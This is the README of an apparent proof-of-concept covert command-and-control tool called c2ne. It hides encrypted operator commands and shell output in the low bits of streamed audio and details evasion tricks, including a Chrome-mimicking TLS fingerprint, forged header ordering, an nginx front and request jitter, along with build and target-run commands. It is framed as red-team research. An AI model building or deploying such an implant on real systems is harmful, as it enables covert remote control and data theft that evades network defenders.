# c2ne
A covert command-and-control POC framework, that enclosed operator commands into the LSB of a live audio stream, making C2 traffic indistiguishable from routine music streaming.

> **Educational / Research Use Only.** This tool is intended for authorised red team engagements, CTF competitions, and security research in controlled environments. Do not use against systems you do not have explicit written permission to test.

```sh
GOOS=linux GOARCH=amd64 go build -o server server.go wav_heaer_helper.go aes-gcm_engine.go
GOOS=linux GOARCH=amd64 go build -o client client.go aes-gcm_engine.go

./server -debug off
#transfer the client to target
./client -target <IP>
```
Table of contents?

## Overview
c2ne hides C2 traffic inside what looks like a Chrome browser streaming music from a self-hosted service. The operator commands from the server, and shell output from the client are encrypted and encoded bit-by-bit into the LSB of audio bytes. No separate C2 channel exists on the wire. The only observable traffic is what appeats to be a user listening to son, with periodic scrobble POSTs and track uploads.
**Key Properties**
- TLS fingerprint identical to Chrome(uTLS `HelloChrome_Auto`)
- HTTP/1.1 with handcrafted authentically-ordered Chrome headers on both client and server.
- Jittered GET request, proportional to realistic streaming chunk consumption
- nginx reverse proxy absorbs any header-ordering artifacts from Go's `http.ServeMux`
- No custom ports, no unusual protocols. All traffic on port 443
- AES-GCM engine, for stream-cipher,  key hardcoded into both client and server

---
## Architecture
On server, CLI stdin --> AES-GCM encrypt --> LSB encoder --> song bytes --> chunk music to client.
On client, Chunk music --> song bytes--> AES-GCM decrypt --> LSB decoder --> command extraction --> shell execution --> output --> AES-GCM encrypt --> scobble/upload body to server

The client opens 2 persistent uTLS connections.
- Connection A - chunked song download. via GET /api/v1/{song}/chunk/{n})
- Connection B - outbound uploads and scrobble POSTs (implant -> operator). via POST /api/v1/{song}/scrobble and POST /api/v1/upload


## Initial Constraints
No commands are issues intil the client has recieved the first complete song (`X-Last-chunk:true`). This is for 2 purposes-
- Client needs raw song bytes in memory to use as the carrier for upload-encoded responses.
- Ensures atleast one full streaming pass occurs before any covert exchange.

---
## AES-GCM + Steganography Engine
### Command Encoding
command string --> AES-GCM encrypt --> "STRT"+command+"STOP" --> convert each char into 8 bits.
-->For each bit b, for each song byte s:
	s= (s &0xFE)|b (overwrite LSB)
-->Modified song bytes streamed in chunks to client
### Command Decoding
Incoming song bytes --> check for first 4 bytes of each chunk for "STRT". If it doesnt exist, move on to next chunk.
If it exists -> extract LSB of each byte -> append to bit buffer --> every 8 bits assembled to byte -> cast to char till you see "STOP"--> AES-GMC decrypt.

Response encoding/decoding follows the approach as commands, in reverse order. If `length(output)<threshold` send response via scrobble POST (`/api/v1/{song}/scrobble`.
Otherwise, send output via Audio file upload (`/api/v1/upload`)

---
## Traffic Evasion
### TSL fingerprint
Both client and server use `uTLS` with `HelloChrome_Auto`. The ClientHello calues (cipher suites, extensions, elliptic curves) are identical to a real Chrome browzer session.
### HTTP headers
Headers are handcrafted on both sides, to mirror Chrome's exact field names, values, and ordering
### nginx reverse proxy
The Go `htt.ServeMux` response path can emit headers in non-deterministic order(something to do with the usage of map in the omplementation), which is a know DPI fingerprint for Go HTTP servers. Placing nginx infront, absorbs thes. The response the client sees has standard, deterministically ordered headers that match a typical streaming service backend.
### Request Jitter
GET chunks requests are not sent at a fixed interval. A random delay is introduced between each batch of GET request. The batch size of GET requests are proportionally calculated from the random delay, mimicing natural cadence of a media player refilling its buffer. This prevents entropy analysis flags.

---
## Limitations
### Known Asymmetry
Every command unconditionally produces a scrobble POST or a File upload in response. The amount of scrobble requests or file uploads that occur are immensely large. Eliminating this without sacrificing throughput would require sacrificing throughput by delaying scrobbles and uploads.
### Alternative
Audio chat would address this issue.